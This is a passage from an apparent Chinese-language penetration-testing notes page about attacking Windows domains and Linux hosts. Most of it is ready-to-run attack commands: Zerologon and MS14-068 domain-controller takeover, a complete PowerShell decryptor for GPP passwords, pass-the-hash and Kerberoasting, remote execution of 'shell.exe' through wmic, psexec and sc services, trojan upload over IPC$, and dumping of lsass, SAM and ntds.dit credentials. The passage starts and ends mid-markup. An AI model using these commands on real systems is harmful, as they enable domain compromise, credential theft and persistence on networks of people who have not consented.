href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h4 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h4><p>查看计划任务，找到有修改权限的计划任务脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;cron*</span><br><span class="line">more &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>比较常用的提权漏洞</p><ul><li> CVE-2016-51951(脏牛提权)</li><li>CVE-2019-14287(sudo 溢出提权)</li></ul><p>使用自动化脚本检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rebootuser&#x2F;LinEnum </span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester</span><br></pre></td></tr></table></figure><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">net user   本机用户</span><br><span class="line">net user &#x2F;domain   域用户</span><br><span class="line">net user username &#x2F;domain   获取指定用户信息</span><br><span class="line">net user username newpassword  &#x2F;domain   修改域用户密码</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain  查看域工作组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain   查看域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain   企业管理员列表</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain   查看域控制器</span><br><span class="line"></span><br><span class="line">net localgroup administrators &#x2F;domain   登录本机的域用户</span><br><span class="line"></span><br><span class="line">net time &#x2F;domain   判断域控</span><br><span class="line"></span><br><span class="line">net view  查看域内机器列表</span><br><span class="line">net start  查看当前运行的服务</span><br><span class="line">net session  查看当前的会话</span><br></pre></td></tr></table></figure><p>定位域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、DNS定位域控</span><br><span class="line">nslookup</span><br><span class="line">&gt;&gt;set type&#x3D;all</span><br><span class="line">&gt;&gt;test.com</span><br><span class="line"></span><br><span class="line">2、nltest &#x2F;dclist:test.com</span><br><span class="line"></span><br><span class="line">3、net time &#x2F;domain</span><br><span class="line"></span><br><span class="line">4、端口：389(ldap)、53(dns)</span><br><span class="line"></span><br><span class="line">5、csvde -setspn &lt;域名&gt; -f C:\windows\temp\output.csv</span><br></pre></td></tr></table></figure><h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>服务主体名称，本质上存的就是域内各种服务资源的对应关系；例如，对应的服务有哪些？服务端口是多少？</p><p>借助spn快速定位当前目标域中所有存活的各类服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T &lt;域名&gt; -Q *&#x2F;*</span><br></pre></td></tr></table></figure><h4 id="dnsdump"><a href="#dnsdump" class="headerlink" title="dnsdump"></a>dnsdump</h4><p>能够获取域内主机IP地址、和主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsdump -u 域名\域用户 -p 域用户密码 域控机器名</span><br></pre></td></tr></table></figure><h4 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure><h3 id="获取域控"><a href="#获取域控" class="headerlink" title="获取域控"></a>获取域控</h3><h4 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h4><p>把普通域用户提升到域控权限，补丁：KB3011780</p><p>方式一、</p><p><a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:test.com  &#x2F;user:username &#x2F;password:password &#x2F;ptt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>方式二、</p><p>mimikatz，这时候并不需要管理员权限。</p><p>ms14-068：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;user   #获取sid</span><br><span class="line">ms14-068.exe -u [域用户]@[所在域] -s [域用户SID] -p [域用户密码] -d [域控地址]     #制作凭证</span><br><span class="line">kerberos::purge    #清除原有凭证</span><br><span class="line">mimikatz.exe &quot;kerberos::ptc c:[上面的凭证]&quot; exit   &#x2F;&#x2F;导入新的凭证</span><br></pre></td></tr></table></figure><p>可以在<code>msf</code>中的<code>meterpreter</code>中直接使用</p><p><img src="/images/image-20210110155155661.png" alt="image-20210110155155661"> </p><p>使用psexec远程连接即可</p><p><img src="/images/image-20210110172341623.png" alt="image-20210110172341623"></p><p>就可以直接添加域管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password &#x2F;add &#x2F;domain</span><br><span class="line">net group &quot;Domain admins&quot; username &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure><h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p> <strong>存在的意义：</strong>在比较大一点的环境中，我们会经常遇到这样的情况，由于电脑的批次不一样，或IT人员流动的问题，造成电脑的本地管理员密码不一致，当我们需要登录到本地管理员的时候，往往会不知道本地管理员密码，虽然我们可以通过进PE的办法破解密码，但如果电脑比较多，那么这将是一个讨厌的工作。如果是域环境，我们可以组策略的方式批量修改计算机的本地管理员密码。</p><p><strong>利用：</strong>实质上就是一种信息收集</p><p>直接访问<code>\\king.com\SYSVOL\king.com\Policies\&#123;0FD0DF94-3629-4ECA-B858-6F0C60B3A821&#125;\User\Preferences\Groups</code></p><p>使用脚本解密：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define helper function that decodes and decrypts password</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">        [<span class="built_in">string</span>] <span class="variable">$Cpassword</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#Append appropriate padding based on string length</span></span><br><span class="line">        <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Make sure System.Core is loaded</span></span><br><span class="line">        [<span class="type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="string">&quot;System.Core&quot;</span>) |<span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">        <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                             <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">        <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length)</span><br><span class="line">        <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">        <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">        <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor()</span><br><span class="line">        [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">catch</span> &#123; <span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>] &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Get-DecryptedCpassword</span> <span class="string">&quot;6s0v9qCdP8OcbP/xlB1XbNUdTDeC5NnDT196ZKinPsE&quot;</span>  <span class="comment"># 修改成相应的密码</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -executionpolicy bypass -file Get-GPPPassword.ps1</span><br></pre></td></tr></table></figure><p><strong>修复建议</strong></p><p>使用PsPasswd批量修改域内主机本地管理员密码</p><h4 id="CVE-2020-1472-域内提权"><a href="#CVE-2020-1472-域内提权" class="headerlink" title="CVE-2020-1472 域内提权"></a>CVE-2020-1472 域内提权</h4><p>直接指向域控，so cool！</p><p><strong>工具</strong></p><p>重置域控用户名为空：<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><p>执行各种命令工具(sudo pip3 install .)：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a> </p><p>恢复域控密码：<a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><p><strong>影响范围</strong></p><blockquote><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><p>将域控密码设置为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;域控机器名&gt; &lt;域控IP&gt;</span><br><span class="line"></span><br><span class="line">python3 cve-2020-1472-exploit.py WIN-03OO218S5B8 192.168.0.4</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210131113629119.png" alt="image-20210131113629119"></p><p>通过 <code>Dcsync</code> 查看密码hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py &lt;域&gt;&#x2F;&lt;域控机器名&gt;\$@&lt;域控IP&gt; -just-dc -no-pass</span><br><span class="line"></span><br><span class="line">secretsdump.py king.com&#x2F;WIN-03OO218S5B8\$@192.168.0.4 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210131113844158.png" alt="image-20210131113844158"></p><p>通过<code>wmiexec.py</code>获取shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py king.com&#x2F;administrator@&lt;域控IP&gt; -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 king.com&#x2F;administrator@192.168.0.4</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">wmiexec.py king.com&#x2F;administrator@&lt;域控IP&gt; -hashes aad3b435b51404eeaad3b435b51404ee:0d546438b1f4c396753b4fc8c8565d5b king.com&#x2F;administrator@192.168.0.4</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210131113948798.png" alt="image-20210131113948798"></p><p><strong>恢复密码</strong></p><p>工具：<a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><p>在上面执行的cmd下执行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># SHELL </span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.saveget security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后利用 <code>secretsdump</code> 解析保存在本地的NT hash</p><p><img src="/images/image-20210131120225956.png" alt="image-20210131120225956"></p><p>记录下上面获取的数据，接下来使用上面提到的工具恢复hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR &lt;ORI_HASH&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210131120402995.png" alt="image-20210131120402995"></p><p>测试用空密码访问，已经失效了</p><p><img src="/images/image-20210131120434157.png" alt="image-20210131120434157"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="SPN票据破解"><a href="#SPN票据破解" class="headerlink" title="SPN票据破解"></a>SPN票据破解</h4><p>导出票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::list &#x2F;export&quot;</span><br></pre></td></tr></table></figure><p>由于加密类型是RC4_HMAC_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。<br>使用字典进行暴力破解：（2.txt为字典）</p><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsrepcrack.py 2.txt &quot;1-40a10000-linghuchong@MSSQLSvc~College-DS1~1433-COLLEGE.COM.kirbi&quot;</span><br></pre></td></tr></table></figure><h4 id="PTH哈希传递"><a href="#PTH哈希传递" class="headerlink" title="PTH哈希传递"></a>PTH哈希传递</h4><p>Windows 网络认证（如SMB 服务）</p><blockquote><p>1、首先客户端会向服务端发送用户信息（其中就包含用户信息）</p><p>2、查看客户端发过来的用户名，如果不存在，认证失败。然后，服务器收到客户端请求后，随机生成一个16位的随机数（叫做Challenge）。使用相应的用户名的 NTLM Hash 加密 Challenge，与此同时将明文的Challenge并返回给客户端。</p><p>3、客户端使用自己的NTLM Hash加密Challenge，然后发送给服务端。</p><p>4、服务端会判断，自己本地加密的Challenge和客户端发送过来加密后的Challenge是否一致，从而判断是否</p></blockquote><p>实际上就是客户端和服务端都使用要登陆用户的NTLM-hash加密同一个Challenge，看看两次加密是否一致，从而实现认证。</p><p>微软于2014年5月打了KB2871997补丁用来防范哈希传递，但是Administrator账号(SID为500)是例外的，使用该账户的NTLM Hash依然可以进行哈希传递</p><h4 id="WMI-回显"><a href="#WMI-回显" class="headerlink" title="WMI(回显)"></a>WMI(回显)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;wmi</span><br></pre></td></tr></table></figure><h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:target_ip &#x2F;user:username &#x2F;password:password process call create c:\shell.bat</span><br><span class="line"></span><br><span class="line">wmic &#x2F;node:target_ip &#x2F;user:username &#x2F;password:password process call create &quot;cmd.exe &#x2F;c net user &amp;&amp; ipconfig&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;node:target_ip &#x2F;user:username &#x2F;password:password process call create &quot;cmd.exe &#x2F;c shell.exe&quot;</span><br></pre></td></tr></table></figure><h4 id="impackets"><a href="#impackets" class="headerlink" title="impackets"></a>impackets</h4><p><a href="https://github.com/SecureAuthCorp/impacket.git">https://github.com/SecureAuthCorp/impacket.git</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hash 000000000000000000000000000000:[ntlm hash] test&#x2F;administrator@target_ip &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h4 id="Smbexec"><a href="#Smbexec" class="headerlink" title="Smbexec"></a>Smbexec</h4><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>Smbexec v2.0是一款基于psexec的域渗透测试工具，并配套samba工具。</p><p>需要远程系统开启<code>ADMIN$</code></p><p>在启动psexec建立连接，远程系统上会安装相应 的服务，因此会留下痕迹</p><blockquote><p>-accepteula阻止弹窗（第一次运行会弹窗）</p><p>-s 以nt authority\system权限运行远程进程</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">psexec \\1.1.1.1 -u amdinistrator -p password cmd </span><br><span class="line"></span><br><span class="line">psexec \\1.1.1.1 -s cmd.exe -accepteula   # </span><br><span class="line"></span><br><span class="line"># 可以通过哈希传递实现命令执行</span><br><span class="line">psexec -hashes:ntlm_hash test.com&#x2F;administrator@1.1.1.1</span><br></pre></td></tr></table></figure><h4 id="IPC利用"><a href="#IPC利用" class="headerlink" title="IPC利用"></a>IPC利用</h4><p>135、445口开放</p><p>建立连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 针对工作组</span><br><span class="line">net use \\ip\ipc$ password &#x2F;user:username</span><br><span class="line"></span><br><span class="line"># 针对域内主机</span><br><span class="line">net use \\ip\ipc$ password &#x2F;user:King.com\username</span><br></pre></td></tr></table></figure><p>其他用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">上传木马：</span><br><span class="line">copy shell.exe \\ip\c$\windows\temp\shell.exe</span><br><span class="line"></span><br><span class="line">下载文件：（直接复制到当前目录）</span><br><span class="line">copy \\ip\c$\windows\temp\shell.exe</span><br><span class="line"></span><br><span class="line">命令执行</span><br><span class="line">psexec \\ip -u username -p password whoami</span><br><span class="line"></span><br><span class="line">cscript wmicexec.vbs &#x2F;cmd domain_name username password whoami</span><br><span class="line"></span><br><span class="line"># 服务 </span><br><span class="line">wmic &#x2F;node:ip &#x2F;user:username &#x2F;password:password process call create &quot;c:\windows\temp\shell.exe&quot;</span><br></pre></td></tr></table></figure><h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个服务</span><br><span class="line">sc \\target_ip create WindowsUpdates binPath&#x3D; &quot;cmd.exe &#x2F;c start net user&quot;</span><br><span class="line"># 执行和删除</span><br><span class="line">sc \\target_ip start WindowsUpdates</span><br><span class="line">sc \\target_ip delete WindowsUpdates</span><br><span class="line"></span><br><span class="line"># 指定administrator账户创建一个 adminsec 的服务</span><br><span class="line">sc \\target_ip create adminsec binPath&#x3D; &quot;c:\shell.exe&quot; obj&#x3D;&quot;adminsec\administrator&quot; password&#x3D; adminsec</span><br><span class="line"></span><br><span class="line">sc \\target_ip start adminsec</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h4 id="获取本地的用户密码"><a href="#获取本地的用户密码" class="headerlink" title="获取本地的用户密码"></a>获取本地的用户密码</h4><p>导出注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system sys.hiv</span><br><span class="line"></span><br><span class="line">reg save hklm\sam sam.hiv</span><br></pre></td></tr></table></figure><p>使用mimikatz解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:sys.hiv&quot; exit &gt; hiv.txt</span><br></pre></td></tr></table></figure><h4 id="获取登录的用户密码"><a href="#获取登录的用户密码" class="headerlink" title="获取登录的用户密码"></a>获取登录的用户密码</h4><blockquote><p>在server2012上只能抓取到hash的密码</p><p>在server2008上能够抓取到明文</p></blockquote><p>在目标机器上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</span><br></pre></td></tr></table></figure><p>将上面获取的文件拿到本地，使用<code>mimikatz.exe</code>获取，结果保存在日志里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><h4 id="导出域控哈希（所有域用户）"><a href="#导出域控哈希（所有域用户）" class="headerlink" title="导出域控哈希（所有域用户）"></a>导出域控哈希（所有域用户）</h4><p>创建快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit</span><br></pre></td></tr></table></figure><p>挂载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;8a8db83f-dad7...&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>复制ntds.dit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_201910121047_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p>关闭挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;umount &#123;8a8db83f-dad7...&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>删除快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil delete &quot;umount &#123;8a8db83f-dad7...&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>获取key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br></pre></td></tr></table></figure><p>使用NTDSDumpEx获取所有域用户的hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure><h4 id="凭证窃取"><a href="#凭证窃取" class="headerlink" title="凭证窃取"></a>凭证窃取</h4><p>如果目前只是获得的域中某个主机的工作组账户，如果想要进如域环境中，可以通过窃取域用户的凭证从而实现。</p><p>查看当前的任务是否由域用户凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure><p>使用incognito.exe盗取凭证，msf自带该工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 列出可以盗取的凭证</span><br><span class="line">incognito.exe list_tikens -u</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">incognito.exe execute -c &quot;&lt;上面列出的tokens，如test.com\administrator&gt;&quot; cmd.exe</span><br></pre></td></tr></table></figure><h4 id="注册表启动项"><a href="#注册表启动项" class="headerlink" title="注册表启动项"></a>注册表启动项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前的启动项</span><br><span class="line">REG query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># 